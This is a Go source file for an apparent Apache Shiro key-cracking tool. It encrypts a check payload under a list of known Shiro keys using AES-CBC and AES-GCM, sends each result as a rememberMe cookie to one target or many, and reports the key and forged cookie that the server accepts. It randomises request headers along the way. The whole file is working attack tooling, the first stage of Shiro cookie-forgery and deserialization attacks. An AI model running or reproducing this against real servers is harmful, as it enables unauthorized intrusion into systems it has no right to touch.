package shiro

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"strings"
	"time"

	"github.com/remeh/sizedwaitgroup"
	uuid "github.com/satori/go.uuid"
	fileutil "github.com/zan8in/pins/file"
	randutil "github.com/zan8in/pins/rand"
	"github.com/zan8in/retryablehttp"
	"github.com/zan8in/shiro/pkg/req"
)

type Options struct {
	Target     string
	TargetFile string

	ShiroKeysFile string

	Proxy   string
	Timeout int
	Retries int
}

type Shiro struct {
	shiroKeys    []string
	checkContent string
	shiroMethod  string
	req          *req.Req
}

type Result struct {
	Flag       bool
	Target     string
	ShiroKey   string
	RememberMe string
}

func NewShiro() (*Shiro, error) {
	shiro := &Shiro{
		shiroKeys:    ShiroKeys,
		checkContent: CheckContent,
		shiroMethod:  ShiroMethod,
	}

	return shiro, nil
}

func (s *Shiro) Run(options Options) (*Result, error) {
	var (
		result = &Result{}
		err    error
	)

	s.req, err = req.New(&req.Options{
		Proxy:   options.Proxy,
		Timeout: options.Timeout,
		Retries: options.Retries,
	})
	if err != nil {
		return result, err
	}

	if len(options.Target) == 0 {
		return result, fmt.Errorf("target is empty")
	}

	if !s.ShiroCheck(options.Target) {
		ok, sk, rme := s.KeyCheck(options.Target)
		result.Flag = ok
		result.Target = options.Target
		result.ShiroKey = sk
		result.RememberMe = rme
	}

	return result, err
}

func (s *Shiro) RunMulti(options Options) (chan *Result, error) {
	if len(options.TargetFile) == 0 {
		return nil, fmt.Errorf("target file is not specified")
	}

	urls, err := fileutil.ReadFile(options.TargetFile)
	if err != nil {
		return nil, err
	}

	result := make(chan *Result)

	go func() {
		defer close(result)

		ticker := time.NewTicker(time.Second / time.Duration(25))
		swg := sizedwaitgroup.New(5)

		for url := range urls {
			swg.Add()

			go func(url string) {
				defer swg.Done()
				<-ticker.C

				opt := options
				opt.Target = url
				rst, err := s.Run(opt)

				if err != nil {
					panic(err)
				}

				if result == nil {
					fmt.Println("result is nil")
					return
				}

				if len(rst.ShiroKey) > 0 {
					result <- rst
				}

			}(url)
		}
	}()

	return result, nil
}

func (s *Shiro) ShiroCheck(TargetUrl string) bool {
	ok, _ := s.HttpRequest("123", TargetUrl)
	return ok
}

var cancel context.CancelFunc

func (s *Shiro) KeyCheck(TargetUrl string) (bool, string, string) {
	Content, _ := base64.StdEncoding.DecodeString(CheckContent)

	var result = make(chan *Result)

	go func() {
		ctx, cancelFunc := context.WithCancel(context.Background())
		cancel = cancelFunc

		ticker := time.NewTicker(time.Second / time.Duration(25))
		swg := sizedwaitgroup.New(5)
		for _, sk := range ShiroKeys {
			swg.Add()
			go func(sk string) {
				defer swg.Done()
				<-ticker.C

				flag, sk, rme := s.FindTheKey(ctx, sk, Content, TargetUrl)
				if flag {
					result <- &Result{
						Flag:       flag,
						Target:     TargetUrl,
						ShiroKey:   sk,
						RememberMe: rme,
					}
					cancel()
				}

			}(sk)
		}
		swg.Wait()

		result <- &Result{Flag: false}
	}()

	for r := range result {
		if r.Flag {
			return r.Flag, r.ShiroKey, r.RememberMe
		}
		if !r.Flag {
			break
		}
	}

	return false, "", ""
}

// return three result
// 1. result boolean
// 2. shirokey
// 3. rememberMe
func (s *Shiro) FindTheKey(ctx context.Context, ShiroKey string, Content []byte, TargetUrl string) (bool, string, string) {

	for {
		select {
		case <-ctx.Done():
			return false, "", ""
		default:
			key, _ := base64.StdEncoding.DecodeString(ShiroKey)
			// result := "[-] Key incorrect "

			var (
				sk  string
				rme string
			)

			RememberMe, err := AesCbcEncrypt(key, Content)
			if err != nil {
				return false, sk, rme
			}
			ok, _ := s.HttpRequest(RememberMe, TargetUrl)
			if ok {
				// result = "[+] CBC-KEY:" + ShiroKey + "\n[+] rememberMe=" + RememberMe
				sk = ShiroKey
				rme = RememberMe
			} else {
				RememberMe, err = AesGcmEncrypt(key, Content)
				if err != nil {
					return false, sk, rme
				}
				ok, _ = s.HttpRequest(RememberMe, TargetUrl)
				if ok {
					// result = "[+] GCM-KEY:" + ShiroKey + "\n[+] rememberMe=" + RememberMe
					sk = ShiroKey
					rme = RememberMe
				}
			}

			return ok, sk, rme
		}
	}

}

func Padding(plainText []byte, blockSize int) []byte {
	n := blockSize - len(plainText)%blockSize
	temp := bytes.Repeat([]byte{byte(n)}, n)
	plainText = append(plainText, temp...)
	return plainText
}

func AesCbcEncrypt(key []byte, Content []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	Content = Padding(Content, block.BlockSize())
	iv := uuid.NewV4().Bytes()
	blockMode := cipher.NewCBCEncrypter(block, iv)
	cipherText := make([]byte, len(Content))
	blockMode.CryptBlocks(cipherText, Content)
	return base64.StdEncoding.EncodeToString(append(iv[:], cipherText[:]...)), nil
}

func AesGcmEncrypt(key []byte, Content []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, 16)
	io.ReadFull(rand.Reader, nonce)
	aesgcm, _ := cipher.NewGCMWithNonceSize(block, 16)
	ciphertext := aesgcm.Seal(nil, nonce, Content, nil)
	return base64.StdEncoding.EncodeToString(append(nonce, ciphertext...)), nil
}

func (s *Shiro) HttpRequest(RememberMe string, TargetUrl string) (bool, error) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(10)*time.Second)
	defer cancel()

	req, err := retryablehttp.NewRequestWithContext(ctx, strings.ToUpper(s.shiroMethod), TargetUrl, strings.NewReader(PostContent))
	if err != nil {
		return false, err
	}

	if strings.ToUpper(s.shiroMethod) == "POST" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	req.Header.Set("User-Agent", randutil.RandomUA())
	req.Header.Set("Cookie", "JSESSIONID="+randutil.Randcase(8)+";rememberMe="+RememberMe)

	resp, err := s.req.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	var SetCookieAll string
	for i := range resp.Header["Set-Cookie"] {
		SetCookieAll += resp.Header["Set-Cookie"][i]
	}
	return !strings.Contains(SetCookieAll, "rememberMe=deleteMe;"), nil

}
